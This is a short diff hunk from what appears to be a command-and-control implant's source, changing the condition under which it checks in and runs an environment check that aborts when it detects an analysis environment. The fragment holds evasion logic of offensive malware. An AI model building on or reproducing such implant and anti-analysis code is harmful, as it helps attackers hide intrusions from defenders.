@@ -30,7 +30,7 @@ namespace Implant {
                 continue;
             }
 
-            if (!Ctx->Session.Checkin) {
+            if (!Ctx->Session.Checkin && !Ctx->Transport.OutboundQueue) {
                 Opsec::SeCheckEnvironment();
                 if (ntstatus == ERROR_BAD_ENVIRONMENT) {
                     return_defer(ntstatus);
